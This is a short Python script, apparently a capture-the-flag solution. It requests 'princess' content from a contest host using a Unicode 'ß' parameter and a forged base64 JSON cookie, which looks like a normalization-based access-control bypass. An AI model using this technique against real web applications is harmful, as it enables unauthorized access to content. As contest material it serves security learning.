import requests
import base64
import json

psyduck = "princeß"
cookies = {"MyFavoritePsyducks": base64.b64encode(json.dumps({"psy": "princeßprincess"}).encode()).decode()}

resp = requests.get(f"http://psyducks.hkn:80/content?psyduck={psyduck}", cookies=cookies)

with open("princess.png", "w+b") as f:
    f.write(resp.content)
